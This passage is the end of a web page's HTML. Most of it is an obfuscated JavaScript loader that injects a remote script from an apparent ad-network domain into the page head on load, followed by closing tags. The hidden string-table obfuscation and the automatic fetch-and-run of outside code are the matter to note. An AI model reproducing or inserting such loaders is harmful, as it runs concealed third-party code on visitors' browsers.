XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>